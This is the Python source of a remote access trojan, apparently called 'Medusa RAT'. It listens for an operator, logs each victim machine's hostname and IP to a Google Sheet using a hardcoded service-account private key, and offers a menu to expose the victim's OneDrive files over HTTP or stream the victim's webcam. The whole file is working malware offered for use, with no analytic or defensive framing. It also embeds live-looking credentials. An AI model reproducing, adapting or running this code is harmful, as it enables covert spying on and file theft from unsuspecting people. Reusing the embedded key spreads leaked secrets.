import http.server
import socket
import socketserver
import os
import cv2
import struct
import pickle
import gspread
from oauth2client.service_account import ServiceAccountCredentials


HOST = socket.gethostbyname(socket.gethostname())
# Connecting to controller on this port
PORT = 8010
# Connecting to webserver on this port
PORT2 = 8888

# SETUP CLIENT-SERVER CONNECTION
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((HOST,PORT))
server.listen()

def database_entry():
    scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
    credentials_json = {
    "type": "service_account",
    "project_id": "ratdb-417917",
    "private_key_id": "f0b0fd3312b52754055608080c68ca3644fdd389",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDU4T0B9SJm0JTx\np2lJkZVhWlfE/C3QJLHa4QPftUdLAQR/ie0AzO7s/ygYejNzqNs6/DkF7ULcD9c0\nifvFU529jwNNnZenu1bmJ90h9qWK0I3PtkTppiaD7TZdgbD1V8QKDyjvaFc4JEoe\nWDbDAK7DznEqsfAlwUFU/Sc6vAjt9tIVEsiRkuF3DFckc2KjOY95oKyADmWKNXJv\nOwkAF4AltaAKRu+5IstesWeW1KWz1vPJxUlaulKZkCjxksDZX3tN+PDSB3gRvsrl\nJLBB/AhbO02UuaywvTHsNzWGA6/Xie9yerE7rVvHsVuEAknh4DcjgJ7veV6tRg2E\n4NNqz6jXAgMBAAECggEABHiEPbhiMd/ZN983xScRIkyk2y0N2NtSS/h1NUULIORK\nvuz1MJLQb8EG4NgwbXAbxgkfjmQkZOQFNXMHvipFOZPB9JGBndMD9dMfgBTvbjmH\nyOiqJixQ0tN4kEDm2yLhOwMebWZU0HbLcbLVtfzoYedbhJv+7ehS8wdrw/5RB7FD\nUoZyVw+VNKRfthi+79n83s4O1/jUVtWtFgr87QgQvP1pYV6WY3nW01hfyOe63AMj\nYyhL5JkJgFcSMSdRemDB8Cdd7CnU5b+kgpt1V0067dOtcCjyoIFV5uk5U5+gEAqU\n/1kIIvH36mI4n6CM0xt2GUmktEcfykpgGWlIxEz0UQKBgQD7kjaoc3LDFvxTPBz0\n9TNT1pQNZigFINg2OoPZuK+G3shRe97pVvAvXBMRetKYf3m9Wtb4jdARlZ83LGkL\n7WTNLLqSDqlO8Z77DfrHNgnH+m2ApTb23K1SU17XXukpOD6ajyzdM5KvBbe3ewBN\noKfQRkJwAzSpiVOKzwxVPcaWsQKBgQDYoKZij4LaINoqWKHGl8/My+a/6vjAQzHc\n70s+ejp0GWK537L+5qJ/qs2eDo7FY7T8ExHuTcF4oGNraFeiyay9AFVp1J5GXi2D\n3rvCmjIngYUCAYYfZYZYj5C4kDA9kApX3uchPkcqmYnt/bEPlOJlTIeJKimzWI27\nrwHMs1CqBwKBgEyMs0ES0Cr5BZK2SgFn01SBiM+C9E6LLf9iUtifUBn0FHRnAu9x\n2uguVkcNXqO0tnCeAafkTxnqs2Xwh45vkCq2n5buCyrQbxXprRONJ/DIDSYGH/GC\nOONCJyvV35EBYltZkcdFeC71yG92aCM27Zl8p565+v5ToS4tzozpnVIhAoGBALI7\nU0oqa23Os9E9hTUhOM52QQ9MY4fEgWUW2SC5bhiRvmHSBLKmzbIetPhDYAJV69Wu\nVwVroi/+Pm5jth7wsZf7i0r8rZCV8fraqj8NoRBSBz5ERLbWUDfTPy4rLBWqymfL\ntPzsAZ+yHgLaxPBd/ft8gNNBBnhR9qMh9WgXbNnHAoGAHdUEQiwTybKPaSJfwVoN\njTGL/WSbMAMUswhvTJwRK3Ch+iIh80r3JJa8/dkvURqEjO0qTAxlKh9ZcVm5jwfq\nXKzhqafNJWSqlTIu6SUj9T8xfdxSMTDfagqF3vCc/2wro/gXUY9tEBB1zsV9l1he\nQEOu7m3qeNhsZeRAh98EJno=\n-----END PRIVATE KEY-----\n",
    "client_email": "medusaratdb@ratdb-417917.iam.gserviceaccount.com",
    "client_id": "111491971753306192051",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/medusaratdb%40ratdb-417917.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
    }
    try:
        credentials = ServiceAccountCredentials.from_json_keyfile_dict(credentials_json, scope)
        # Authenticate with Google Sheets API
        gc = gspread.authorize(credentials)
        # Open the spreadsheet (by title or URL)
        spreadsheet_url = 'https://docs.google.com/spreadsheets/d/18VtJFRIdnrS13vTYKehZRncohnjbPXhJAwIprYfSKeU/edit?usp=sharing'
        spreadsheet = gc.open_by_url(spreadsheet_url)
        # Select the worksheet you want to read from
        worksheet = spreadsheet.sheet1 
        # Read data from the worksheet
        data = worksheet.get_all_values()
        for x in data[1:]:
            # print(x[1])
            # print(type(x[1]))
            if x[1] == HOST:    
                print("same")
                continue
            else:
                new_row_values = [socket.gethostname(),HOST, PORT,PORT2,'ONLINE']
                worksheet.append_row(new_row_values)
    except:
        communication_socket.send('No Internet Connection, unable to contact API'.encode('utf-8'))

# FUNCTIONS TO ENTERTAIN CLIENT REQUESTS:

# CLIENT REQUEST 0
def close_connection():
    communication_socket.close()
    x = False
        
# CLIENT REQUEST 1
def access_files():
    # CHANGE DIRECTORY YOU WANT
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']),'OneDrive')
    os.chdir(desktop)

    # creating a http request
    Handler = http.server.SimpleHTTPRequestHandler

    # finding the IP address of the PC
    link = "http://" + HOST + ":" + str(PORT2)

    # Continuous stream of data between client and server
    with socketserver.TCPServer((HOST, PORT2), Handler) as httpd:
        communication_socket.send(f"Connected on: {HOST}, {PORT2}".encode('utf-8'))
        communication_socket.send(f"File System of victim can be accessed from this link, {link}".encode('utf-8'))
        httpd.serve_forever()

# CLIENT REQUEST 2
def access_webcam():
    communication_socket.send(f"WebCam Initiated at: {HOST}, {PORT}".encode('utf-8'))
    # Capturing Video Frame using CV2:
    vid = cv2.VideoCapture(0)

    # SOCKET ACCEPT:
    while True:
        # READING FRAMES FROM CAMERA
        img, frame = vid.read()
        # USING PICKLE TO SERIALIZE FRAMES TO BYTE DATA
        data = pickle.dumps(frame)
        # PACKING EACH FRAME DATA USNG STRUCT MODULE
        message = struct.pack("L",len(data))+data

        # SENDING THIS PACKED DATA TO CLIENT:
        communication_socket.sendall(message)

        # Wait for a key press and break the loop if 'q' is pressed
        key = cv2.waitKey(1) & 0xFF
        if key == ord('q'):
            break

    # Release the camera and close the sockets
    vid.release()
    communication_socket.close()
    server.close()


def connect_client():
    communication_socket , address = server.accept()
    communication_socket.send(f'I am connected to {socket.gethostname()}'.encode('utf-8'))
    communication_socket.send(f'IP address: {HOST}\n'.encode('utf-8')) 
    return communication_socket, address

x = True
counter = 0
while x == True:
    # Setting up client-server connection
    communication_socket, address = connect_client()
    client_request = None

    # Confguring database 
    if counter == 0: # To make sure this thing happens once only!
        communication_socket.send('Please Wait, configuring database'.encode('utf-8'))
        database_entry()
        communication_socket.send('Success!'.encode('utf-8'))
        counter += 1
    
    available_attack_options = [0,1,2]

    while client_request not in available_attack_options:
        communication_socket.send(f"What Do You Want To Do? \n0)Choose 0 To Close The Communication \n1)Choose 1 for victim's filesystem \n2)Choose 2 for victim's camera".encode('utf-8'))
        communication_socket.send('\nEnter Your INPUT Here: '.encode('utf-8'))
        client_request = int(communication_socket.recv(1024).decode('utf-8'))

    # ENTERTAINING CLIENT'S REQ TO CLOSE THE COMMUNICATION
    if client_request == 0:
        close_connection()
        
    #ENTERTAINING CLIENT'S REQUEST TO ACCESS FILES OF VICTIM:
    elif client_request == 1:
        access_files()

    elif client_request == 2:
        access_webcam() 

    # IN ANYOTHER CASE:
    else:
        # print('case of else!')
        communication_socket.send(f"Sorry Command not Recognised, choose from: , {available_attack_options}".encode('utf-8'))
        
    
    



